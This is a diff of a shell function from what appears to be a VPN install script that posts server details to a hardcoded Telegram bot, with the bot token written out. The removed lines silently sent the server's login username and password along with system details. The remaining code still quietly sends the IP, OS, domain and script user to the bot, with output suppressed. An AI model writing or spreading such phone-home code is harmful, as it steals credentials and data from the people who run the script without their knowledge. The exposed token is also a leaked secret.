@@ -335,26 +335,18 @@ function password_default() {
     KEY="6338068936:AAHiZflXdNWM6vrWgu474SXhzxcKZ_ITDv0"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script 
+    TEXT="
+    ============================
+       ‼️ Registrasi Script ‼️
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
-    <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
     <code>OS Vps     :</code> <code>$OS_Name</code>
-    <code>Kernel     :</code> <code>$Kernel</code>
-    <code>Arch       :</code> <code>$Arch</code>
-    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
-    ============================
     <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
-    (C) Copyright 2023 
-    ============================
+    Auto Massage from BOT Registered 
 "
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
